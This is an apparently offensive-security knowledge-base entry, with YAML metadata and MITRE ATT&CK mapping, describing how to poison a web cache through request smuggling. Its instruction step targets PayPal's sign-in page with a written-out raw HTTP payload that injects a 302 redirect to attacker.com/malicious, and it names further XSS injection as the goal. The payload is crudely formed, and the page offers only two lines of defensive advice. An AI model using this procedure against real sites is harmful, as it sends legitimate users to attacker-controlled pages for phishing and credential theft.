---
tags:
  - cache-poisoning
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-http-smuggling]]'
  - '[[commands/burp-request-manipulation]]'
platforms:
  - Web
techniques:
  - '[[Adversary-in-the-Middle]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: fb1c41d5-cb02-409b-948e-35e20fbca57b
created_at: '2025-12-11T06:10:28.696Z'
updated_at: '2025-12-11T06:10:28.696Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1557]]'
---
# Poison Cache with Malicious Redirect

## Summary

This procedure uses exploited request smuggling to inject malicious redirects into the cache of frontend servers, allowing persistent alteration of page responses.

## Description

Cache poisoning involves forcing a cache to store attacker-controlled content, such as redirects, which are then served to legitimate users. Here, it's applied to PayPal's caching servers for the sign-in page, enabling further XSS injection.

## Requirements

1. Successful request smuggling access
2. Tool for request manipulation like [[tools/Burp-Suite]]
3. Target caching endpoint

## Defense

- Use cache keys that include full request details
- Regularly purge or validate cached content

## Objectives

1. Create a cached malicious redirect
2. Ensure persistence in the cache
3. Set up for payload injection

## Instructions

### Step 1: Craft Poisoned Redirect

**Context**: Build a request that poisons the cache with a redirect.

Execute [[commands/burp-request-manipulation]] to send:

```bash
POST /signin HTTP/1.1\r\nHost: paypal.com\r\nContent-Length: 0\r\n\r\nHTTP/1.1 302 Found\r\nLocation: https://attacker.com/malicious
```

> This stores the redirect in the cache.

### Step 2: Verify Cache Poisoning

**Context**: Test if the cache serves the poisoned content.

Access the URL normally and check for the redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Adversary-in-the-Middle]]

### Sub-Techniques

## Commands Used

- [[commands/burp-request-manipulation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[cache-poisoning]]
- [[web]]
